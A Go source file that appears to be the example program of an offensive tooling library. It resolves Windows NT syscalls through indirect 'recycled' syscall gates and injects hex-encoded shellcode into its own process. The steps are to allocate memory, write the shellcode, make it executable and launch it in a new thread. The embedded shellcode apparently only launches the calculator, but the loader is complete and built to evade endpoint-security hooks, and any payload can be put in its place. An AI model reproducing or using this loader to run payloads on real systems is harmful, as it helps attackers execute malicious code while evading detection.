package main

import (
	"fmt"
	"unsafe"
	"strconv"
	// this import is unneeded, but i left it because i am proud of my project and want to use it
	// you could resolve and call ntclose 
	"github.com/carved4/go-wincall"
	"github.com/carved4/gorecycle/pkg/syscall"
	rc "github.com/carved4/gorecycle/pkg/recycle"
	"github.com/carved4/gorecycle/pkg/dump"
	"github.com/carved4/gorecycle/pkg/types"
)



func getEmbeddedShellcode() []byte {
	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"

	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}
func main() {
	fmt.Println("[+] gorecycle - self injection")


	dump.DumpAllSyscalls()
	fmt.Println()

	var ntAllocateVirtualMemory types.Syscall
	var ntWriteVirtualMemory types.Syscall
	var ntProtectVirtualMemory types.Syscall
	var ntCreateThreadEx types.Syscall
	var ntWaitForSingleObject types.Syscall

	if !rc.GetSyscall("NtAllocateVirtualMemory", &ntAllocateVirtualMemory) {
		fmt.Println("[-] failed to resolve NtAllocateVirtualMemory")
		return
	}
	fmt.Printf("[+] ntalloc resolved: 0x%x - 0x%x\n", ntAllocateVirtualMemory.Nr, ntAllocateVirtualMemory.Gate)

	if !rc.GetSyscall("NtWriteVirtualMemory", &ntWriteVirtualMemory) {
		fmt.Println("[-] failed to resolve NtWriteVirtualMemory")
		return
	}
	fmt.Printf("[+] ntwrite resolved: 0x%x - 0x%x\n", ntWriteVirtualMemory.Nr, ntWriteVirtualMemory.Gate)

	if !rc.GetSyscall("NtProtectVirtualMemory", &ntProtectVirtualMemory) {
		fmt.Println("[-] failed to resolve NtProtectVirtualMemory")
		return
	}
	fmt.Printf("[+] ntprotect resolved: 0x%x - 0x%x\n", ntProtectVirtualMemory.Nr, ntProtectVirtualMemory.Gate)

	if !rc.GetSyscall("NtCreateThreadEx", &ntCreateThreadEx) {
		fmt.Println("[-] failed to resolve NtCreateThreadEx")
		return
	}
	fmt.Printf("[+] ntcreatethreadex resolved: 0x%x - 0x%x\n", ntCreateThreadEx.Nr, ntCreateThreadEx.Gate)

	if !rc.GetSyscall("NtWaitForSingleObject", &ntWaitForSingleObject) {
		fmt.Println("[-] failed to resolve NtWaitForSingleObject")
		return
	}
	fmt.Printf("[+] ntwait resolved: 0x%x - 0x%x\n", ntWaitForSingleObject.Nr, ntWaitForSingleObject.Gate)


	currentProcess := uintptr(0xffffffffffffffff) 

	shellcode := getEmbeddedShellcode()
	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))

	result, _ := syscall.IndirectSyscall(
		ntAllocateVirtualMemory.Nr,
		ntAllocateVirtualMemory.Gate,
		currentProcess,
		uintptr(unsafe.Pointer(&baseAddress)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		rc.MEM_COMMIT|rc.MEM_RESERVE,
		rc.PAGE_READWRITE,
	)

	if result != 0 {
		fmt.Printf("[-] ntalloc failed: 0x%x\n", result)
		return
	}
	fmt.Printf("[+] allocd RW memory at: 0x%x\n", baseAddress)


	var bytesWritten uintptr
	result, _ = syscall.IndirectSyscall(
		ntWriteVirtualMemory.Nr,
		ntWriteVirtualMemory.Gate,
		currentProcess,
		baseAddress,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if result != 0 {
		fmt.Printf("[-] NtWriteVirtualMemory failed: 0x%x\n", result)
		return
	}
	fmt.Printf("[+] wrote %d bytes of shellcode\n", bytesWritten)


	var oldProtect uint32
	result, _ = syscall.IndirectSyscall(
		ntProtectVirtualMemory.Nr,
		ntProtectVirtualMemory.Gate,
		currentProcess,
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(unsafe.Pointer(&regionSize)),
		rc.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if result != 0 {
		fmt.Printf("[-] NtProtectVirtualMemory failed: 0x%x\n", result)
		return
	}
	fmt.Printf("[+] changed protection to RX (old: 0x%x)\n", oldProtect)


	var threadHandle uintptr
	result, _ = syscall.IndirectSyscall(
		ntCreateThreadEx.Nr,
		ntCreateThreadEx.Gate,
		uintptr(unsafe.Pointer(&threadHandle)), // OUT PHANDLE ThreadHandle
		rc.THREAD_ALL_ACCESS,                   // IN ACCESS_MASK DesiredAccess
		0,                                      // IN POBJECT_ATTRIBUTES ObjectAttributes (NULL)
		currentProcess,                         // IN HANDLE ProcessHandle
		baseAddress,                            // IN PVOID StartRoutine
		0,                                      // IN PVOID Argument (NULL)
		0,                                      // IN ULONG CreateFlags (0 = not suspended)
		0,                                      // IN SIZE_T ZeroBits
		0,                                      // IN SIZE_T StackSize
		0,                                      // IN SIZE_T MaximumStackSize
		0,                                      // IN PPS_ATTRIBUTE_LIST AttributeList (NULL)
	)

	if result != 0 {
		fmt.Printf("[-] NtCreateThreadEx failed: 0x%x\n", result)
		return
	}
	fmt.Printf("[+] created thread with handle: 0x%x\n", threadHandle)


	result, _ = syscall.IndirectSyscall(
		ntWaitForSingleObject.Nr,
		ntWaitForSingleObject.Gate,
		threadHandle,
		0, // FALSE - don't make alertable
		0, // INFINITE timeout (NULL pointer)
	)

	if result != 0 {
		fmt.Printf("[+] thread execution completed with status: 0x%x\n", result)
	} else {
		fmt.Println("[+] thread execution completed successfully")
	}

	wincall.Call("kernel32", "CloseHandle", threadHandle)

	fmt.Println("[+] self-injection completed via recycled syscalls")
}
